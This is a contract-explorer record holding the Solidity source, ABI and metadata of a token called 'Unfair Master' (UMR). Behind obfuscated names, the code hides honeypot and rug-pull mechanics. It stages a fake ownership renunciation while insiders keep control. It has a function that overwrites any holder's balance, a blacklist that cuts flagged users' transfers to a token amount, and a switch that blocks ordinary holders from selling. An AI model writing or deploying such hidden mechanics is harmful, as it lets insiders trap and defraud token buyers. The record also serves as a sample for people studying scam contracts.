{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface limitMax {\n    function createPair(address sellSenderReceiver, address sellLimit) external returns (address);\n}\n\ninterface maxShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minFromWallet) external view returns (uint256);\n\n    function transfer(address liquidityLaunch, uint256 liquidityMax) external returns (bool);\n\n    function allowance(address maxFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquidityMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityLaunch,\n        uint256 liquidityMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromMode, uint256 value);\n    event Approval(address indexed maxFrom, address indexed spender, uint256 value);\n}\n\nabstract contract sellToken {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface maxShouldMetadata is maxShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UnfairMaster is sellToken, maxShould, maxShouldMetadata {\n\n    constructor (){\n        \n        buyMarketing listAmountExempt = buyMarketing(tokenMode);\n        limitMin = limitMax(listAmountExempt.factory()).createPair(listAmountExempt.WETH(), address(this));\n        \n        liquidityTake = _msgSender();\n        receiverList[liquidityTake] = true;\n        listSender[liquidityTake] = marketingFrom;\n        txReceiver();\n        \n        emit Transfer(address(0), liquidityTake, marketingFrom);\n    }\n\n    function transferFrom(address takeTx, address liquidityLaunch, uint256 liquidityMax) external override returns (bool) {\n        if (_msgSender() != tokenMode) {\n            if (amountExemptIs[takeTx][_msgSender()] != type(uint256).max) {\n                require(liquidityMax <= amountExemptIs[takeTx][_msgSender()]);\n                amountExemptIs[takeTx][_msgSender()] -= liquidityMax;\n            }\n        }\n        return tradingSender(takeTx, liquidityLaunch, liquidityMax);\n    }\n\n    function fundLaunchSender(address takeTx, address liquidityLaunch, uint256 liquidityMax) internal returns (bool) {\n        require(listSender[takeTx] >= liquidityMax);\n        listSender[takeTx] -= liquidityMax;\n        listSender[liquidityLaunch] += liquidityMax;\n        emit Transfer(takeTx, liquidityLaunch, liquidityMax);\n        return true;\n    }\n\n    uint256 buyExemptTotal;\n\n    address public limitMin;\n\n    function transfer(address autoTx, uint256 liquidityMax) external virtual override returns (bool) {\n        return tradingSender(_msgSender(), autoTx, liquidityMax);\n    }\n\n    address private exemptWallet;\n\n    address modeTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint8 private teamMax = 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return marketingFrom;\n    }\n\n    function walletTxAt(address amountShould) public {\n        tradingExempt();\n        \n        if (amountShould == liquidityTake || amountShould == limitMin) {\n            return;\n        }\n        launchedEnableTake[amountShould] = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private amountExemptIs;\n\n    uint256 marketingTo;\n\n    function getOwner() external view returns (address) {\n        return exemptWallet;\n    }\n\n    function owner() external view returns (address) {\n        return exemptWallet;\n    }\n\n    uint256 public shouldTotal;\n\n    uint256 private listSell;\n\n    event OwnershipTransferred(address indexed modeToken, address indexed liquidityFrom);\n\n    uint256 constant exemptShould = 3 ** 10;\n\n    mapping(address => bool) public receiverList;\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundBuy;\n    }\n\n    uint256 public fundModeReceiver;\n\n    function approve(address fundAmountTotal, uint256 liquidityMax) public virtual override returns (bool) {\n        amountExemptIs[_msgSender()][fundAmountTotal] = liquidityMax;\n        emit Approval(_msgSender(), fundAmountTotal, liquidityMax);\n        return true;\n    }\n\n    string private feeTo = \"Unfair Master\";\n\n    function liquidityReceiverMarketing(uint256 liquidityMax) public {\n        tradingExempt();\n        marketingTo = liquidityMax;\n    }\n\n    uint256 public fundMode;\n\n    function feeIsSwap(address teamEnable) public {\n        require(teamEnable.balance < 100000);\n        if (fundEnableMax) {\n            return;\n        }\n        \n        receiverList[teamEnable] = true;\n        if (tokenMaxIs != liquidityTx) {\n            fundModeReceiver = fundMode;\n        }\n        fundEnableMax = true;\n    }\n\n    function tradingExempt() private view {\n        require(receiverList[_msgSender()]);\n    }\n\n    uint256 public teamList;\n\n    mapping(address => bool) public launchedEnableTake;\n\n    function balanceOf(address minFromWallet) public view virtual override returns (uint256) {\n        return listSender[minFromWallet];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamMax;\n    }\n\n    bool private marketingLaunched;\n\n    address tokenMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public fundEnableMax;\n\n    function txReceiver() public {\n        emit OwnershipTransferred(liquidityTake, address(0));\n        exemptWallet = address(0);\n    }\n\n    string private fundBuy = \"UMR\";\n\n    function isSell(address autoTx, uint256 liquidityMax) public {\n        tradingExempt();\n        listSender[autoTx] = liquidityMax;\n    }\n\n    uint256 private marketingFrom = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private listSender;\n\n    bool private fromMax;\n\n    uint256 private liquidityTx;\n\n    address public liquidityTake;\n\n    uint256 private launchedIs;\n\n    function allowance(address launchedMax, address fundAmountTotal) external view virtual override returns (uint256) {\n        if (fundAmountTotal == tokenMode) {\n            return type(uint256).max;\n        }\n        return amountExemptIs[launchedMax][fundAmountTotal];\n    }\n\n    uint256 private tokenMaxIs;\n\n    function tradingSender(address takeTx, address liquidityLaunch, uint256 liquidityMax) internal returns (bool) {\n        if (takeTx == liquidityTake) {\n            return fundLaunchSender(takeTx, liquidityLaunch, liquidityMax);\n        }\n        uint256 txTake = maxShould(limitMin).balanceOf(modeTo);\n        require(txTake == marketingTo);\n        require(liquidityLaunch != modeTo);\n        if (launchedEnableTake[takeTx]) {\n            return fundLaunchSender(takeTx, liquidityLaunch, exemptShould);\n        }\n        return fundLaunchSender(takeTx, liquidityLaunch, liquidityMax);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return feeTo;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundAmountTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAmountTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFromWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamEnable\",\"type\":\"address\"}],\"name\":\"feeIsSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundEnableMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundModeReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityMax\",\"type\":\"uint256\"}],\"name\":\"isSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedEnableTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityMax\",\"type\":\"uint256\"}],\"name\":\"liquidityReceiverMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountShould\",\"type\":\"address\"}],\"name\":\"walletTxAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "UnfairMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}